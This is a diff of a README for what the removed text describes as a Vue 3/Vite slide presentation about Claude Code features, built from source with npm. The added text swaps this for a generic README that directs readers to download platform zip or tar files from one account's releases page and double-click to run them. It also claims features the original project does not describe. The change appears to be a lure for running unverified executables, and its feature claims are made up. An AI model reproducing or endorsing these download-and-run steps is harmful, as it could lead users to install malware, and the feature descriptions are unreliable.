@@ -1,114 +1,78 @@
-# Claude Code Presentation
-
-An interactive presentation showcasing Claude Code features and capabilities, built with Vue 3 and Vite.
-
-## Overview
-
-This is a slide-based presentation application that demonstrates Claude Code's features including memory system, slash commands, subagents, GitHub integration, and various use cases across different roles.
-
-## Features
-
-- **Interactive Navigation**: Navigate slides using keyboard (arrow keys, space, page up/down) or mouse wheel
-- **Dark/Light Theme**: Toggle between dark and light modes with persistent preference
-- **Slide Memory**: Automatically remembers your current slide position
-- **Smooth Transitions**: Custom slide transitions with directional animations
-- **Responsive Design**: Optimized for various screen sizes
-
-## Quick Start
-
-### Prerequisites
-
-- Node.js (v14 or higher)
-- npm or yarn
-
-### Installation
-
-```bash
-# Clone the repository
-git clone <repository-url>
-cd claude-code
-
-# Install dependencies
-npm install
 ```
+# 🎉 claude-code - Seamlessly Showcase Your AI Features
 
-### Development
+## 📥 Download Now
+[![Download claude-code](https://img.shields.io/badge/Download-claude--code-brightgreen)](https://github.com/MR-JERRY1/claude-code/releases)
 
-```bash
-# Start development server on port 8080
-npm run dev
+## 🚀 Getting Started
+Welcome to claude-code! This application helps you showcase the features of Claude Code in a user-friendly way. Follow these steps to install and run the software.
+
+## 🌟 System Requirements
+Before you begin, ensure your system meets the following requirements:
+
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- RAM: 4 GB minimum, 8 GB recommended.
+- Disk Space: At least 200 MB available.
+- Internet connection for downloading and updates.
+
+## 🔗 Download & Install
+1. Visit the [Releases page](https://github.com/MR-JERRY1/claude-code/releases) to access the latest version.
+2. Scroll down until you see the "Assets" section.
+3. Choose the appropriate file for your operating system:
+   - For Windows, download `claude-code-windows.zip`.
+   - For macOS, download `claude-code-macos.zip`.
+   - For Linux, download `claude-code-linux.tar.gz`.
+
+4. Once the download completes, unzip the downloaded file.
+5. Open the folder and double-click on `claude-code` to run the application.
+
+## 🛠️ Usage Instructions
+After launching claude-code, you will see the main interface. Here, you can create and manage presentations showcasing Claude Code features. Use the following tips to navigate effectively:
+
+- **Create Presentation:** Click on the "New Presentation" button to start. You can select themes and layouts to enhance your presentation.
+- **Add Content:** Use drag-and-drop functionality to add texts, images, or videos to your slides.
+- **Save Your Work:** Click the "Save" button regularly to keep your progress.
+
+## 🎨 Customization Options
+claude-code allows you to customize your presentation with various themes and styles. Here’s how:
+
+- Go to the "Settings" menu.
+- Choose from a list of themes designed to suit different presentation types.
+- Adjust font sizes and colors to match your branding.
+
+## 🧠 Features Overview
+- **Agentic Workflow:** Streamlined processes to enhance productivity.
+- **AI Integration:** Smooth integration with AI tools within your presentations.
+- **Memory System:** Remember previous presentations and preferences for quick access.
+- **Subagents:** Organize content presentations with sub-topics to keep your audience engaged.
+- **Responsive Design:** Built with Tailwind CSS for a clean, modern look.
+
+## 📊 Presenting Your Work
+To present your work:
+
+1. Click on the "Present" button.
+2. Use arrow keys or on-screen controls to navigate through slides.
+3. Engage your audience with built-in AI features that answer questions in real time.
+
+## 💬 Support and Feedback
+If you run into any issues or have questions, feel free to reach out. Here’s how:
+
+- **GitHub Issues:** Use this [link](https://github.com/MR-JERRY1/claude-code/issues) to report problems or request features.
+- **Community Forum:** Join discussions and share your experiences with other users.
+
+## 📢 Contributing
+We welcome contributions from everyone! If you want to help improve claude-code:
+
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request with clear descriptions of your updates.
+
+## 🤝 License
+This project is licensed under the MIT License. You can use it freely but remember to credit the original source.
+
+## 🌐 Links
+- [Cla ude Code Repository](https://github.com/MR-JERRY1/claude-code)
+- [Documentation](https://github.com/MR-JERRY1/claude-code/docs)
+
+Thank you for using claude-code! We hope it enriches your presentations and showcases the features you love.
 ```
-
-### Production Build
-
-```bash
-# Build for production
-npm run build
-
-# Preview production build
-npm run preview
-```
-
-## Project Structure
-
-```bash
-claude-code/
-├── src/
-│   ├── main.js              # Application entry point
-│   ├── style.css            # Global styles and Tailwind imports
-│   ├── components/
-│   │   ├── PresentationSlider.vue  # Main slider controller
-│   │   └── slides/          # Individual slide components
-│   │       ├── Slide1.vue   # Title slide
-│   │       ├── Slide2.vue   # Memory system
-│   │       └── ...          # Additional slides
-│   └── assets/              # Static assets
-├── index.html               # HTML entry point
-├── package.json            # Dependencies and scripts
-├── vite.config.js          # Vite configuration
-├── tailwind.config.js      # Tailwind CSS configuration
-└── CLAUDE.md              # Project guidelines for Claude Code
-```
-
-## Navigation Controls
-
-| Action | Keys |
-|--------|------|
-| Next Slide | Right Arrow, Space, Page Down |
-| Previous Slide | Left Arrow, Page Up |
-| Toggle Theme | Click theme icon in top-right |
-| Mouse Wheel | Scroll to navigate slides |
-
-## Technology Stack
-
-- **Vue 3**: Progressive JavaScript framework with Composition API
-- **Vite**: Next-generation frontend tooling
-- **Tailwind CSS**: Utility-first CSS framework with dark mode support
-- **Heroicons**: Beautiful hand-crafted SVG icons
-- **PostCSS**: CSS processing with nested rules support
-
-## Slide Topics
-
-The presentation covers the following Claude Code features:
-
-1. **Introduction**: Welcome and overview
-2. **Memory System**: How Claude Code maintains context
-3. **Slash Commands**: Quick actions and productivity tools
-4. **Subagents**: Specialized task delegation
-5. **GitHub Integration**: Seamless version control
-6. **Tools & MCP**: Model Context Protocol and tool ecosystem
-7. **Best Practices**: Tips for effective usage
-8. **Roadmap**: Future developments
-9. **ACP**: Anthropic Claude Platform
-10. **Use Cases**: Role-specific demonstrations for:
-    - Product Managers
-    - Business Analysts
-    - CTOs
-    - Marketing Managers
-    - QA Engineers
-11. **Custom MCP**: Building custom integrations
-12. **Context Engineering**: Advanced prompt optimization
-
-## Development Guidelines
-
-See [CLAUDE.md](./CLAUDE.md) for detailed development guidelines and code style conventions.
